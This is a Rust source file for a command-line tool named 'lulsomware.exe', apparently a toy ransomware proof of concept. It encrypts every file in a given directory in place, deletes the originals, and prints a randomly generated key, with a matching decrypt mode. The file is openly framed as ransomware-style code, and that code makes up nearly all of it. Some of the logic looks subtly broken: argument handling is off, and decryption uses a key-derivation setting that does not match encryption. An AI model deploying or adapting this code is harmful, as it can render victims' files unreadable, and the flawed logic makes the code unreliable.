use std::env;
use std::fs;
use std::fs::DirEntry;
use std::process::exit;

use encryptfile as ef;
use rand::Rng;
use rand::thread_rng;

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        exit_with_help();
    }

    let human_readable_encryption_key = set_encryption_key(&args);

    // TODO: add recursion for files in nested folder structures
    let action = args[1].as_str();
    let working_directory = args[2].as_str();
    let directory_entries = fs::read_dir(working_directory).expect("Can't read");

    println!("Command: {} {}", action, working_directory);
    for entry in directory_entries {
        let dir_entry = entry.unwrap();
        println!("{}::{}...", action, dir_entry.file_name().into_string().unwrap());

        if action == "encrypt" {
            encrypt_file(&dir_entry, human_readable_encryption_key.clone());
        } else if action == "decrypt" {
            decrypt_file(&dir_entry, human_readable_encryption_key.clone());
        }

        print!("{}::{} OK", action, dir_entry.file_name().into_string().unwrap());
        println!();
    }
}

fn set_encryption_key(args: &Vec<String>) -> String {
    let human_readable_encryption_key: String;

    if args.len() < 4 || args[3].clone() == "" {
        human_readable_encryption_key = generate_random_password();
    } else {
        human_readable_encryption_key = args[3].clone();
    }

    println!("Using key: {}", human_readable_encryption_key.clone());
    return human_readable_encryption_key;
}

fn generate_random_password() -> String {
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ\
                            abcdefghijklmnopqrstuvwxyz\
                            0123456789)(*&^%$#@!~";
    const PASSWORD_LEN: usize = 32;
    let mut rng = thread_rng();

    let password: String = (0..PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect();

    return password;
}

fn encrypt_file(file: &DirEntry, password: String) {
    let path = file.path().into_os_string().into_string().unwrap();
    let temp_filename = &format!("{}_{}", "xxx", file.file_name().into_string().unwrap());

    let mut encryption_config = ef::Config::new();
    encryption_config.input_stream(ef::InputStream::File(path.clone()))
        .output_stream(ef::OutputStream::File(temp_filename.to_owned()))
        .add_output_option(ef::OutputOption::AllowOverwrite)
        .initialization_vector(ef::InitializationVector::GenerateFromRng)
        .password(ef::PasswordType::Text(password.to_owned(), ef::scrypt_defaults()))
        .encrypt();
    let _ = ef::process(&encryption_config).map_err(|e| panic!("error encrypting: {:?}", e));

    fs::remove_file(path.clone()).unwrap();
    fs::rename(temp_filename, path.clone()).unwrap();
}

fn decrypt_file(file: &DirEntry, password: String) {
    let path = file.path().into_os_string().into_string().unwrap();
    let temp_filename = &format!("{}_{}", "xxx", file.file_name().into_string().unwrap());

    let mut decryption_config = ef::Config::new();
    decryption_config.input_stream(ef::InputStream::File(path.clone()))
        .output_stream(ef::OutputStream::File(temp_filename.to_owned()))
        .add_output_option(ef::OutputOption::AllowOverwrite)
        .password(ef::PasswordType::Text(password.to_owned(), ef::PasswordKeyGenMethod::ReadFromFile))
        .decrypt();
    // TODO: error handling for invalid key being used
    let _ = ef::process(&decryption_config).map_err(|e| panic!("error decrypting: {:?}", e));

    fs::remove_file(path.clone()).unwrap();
    fs::rename(temp_filename, path.clone()).unwrap();
}

fn exit_with_help() {
    println!("Encrypt: lulsomware.exe encrypt [directory]");
    println!("Decrypt: lulsomware.exe decrypt [directory] [key]");
    exit(1);
}


